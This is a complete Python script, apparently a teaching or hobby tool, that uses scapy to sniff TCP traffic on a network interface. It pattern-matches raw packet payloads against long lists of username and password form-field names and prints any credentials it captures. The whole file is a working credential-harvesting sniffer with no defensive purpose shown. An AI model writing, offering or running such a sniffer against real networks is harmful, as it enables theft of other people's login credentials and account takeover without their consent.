from scapy.all import *
from urllib import parse
import re

from scapy.layers.inet import TCP

iface = 'eth0'  # check this


def get_login_pass(body):
    user = None
    passwd = None
    userfield = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'nickname', 'user', 'alias',
                 'psuedo', 'email', 'username', 'userid', 'for_loggin', 'login_id', "loginid", 'session_key', 'uname',
                 'ulogin', 'accname', 'account', 'member', 'membername', 'login_email', 'loginusername', 'loginemail',
                 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'Login_password',
                  'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'login-password', 'passwort', 'passwrd',
                  'upasswd', 'senha', 'contrasena']
    for login in userfield:
        login_re = re.search("(%s=[^&]+)" % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    for passfield in passfields:
        pass_re = re.search("(%s=[^&]+)" % passfield, body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group()
    if user and passwd:
        return (user, passwd)


def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = ''.join(map(chr, bytes(packet[TCP].payload))) # to remove warning: calling str(pkt) makes no sense, for  - body = str(packet[TCP].payload)
        username_password = get_login_pass(body)
        if username_password != None: # returning two object to single and later traverse
            print(parse.unquote(username_password[0]))
            print(parse.unquote(username_password[1]))
            print(packet[TCP].payload)
    else:
        pass


try:
    sniff(iface=iface, prn=pkt_parser,
          store=0)  # interface ,prn = function to parse the packet using sniff function, store=0 means no storing
except KeyboardInterrupt:
    print("Exiting!")
    exit(0)
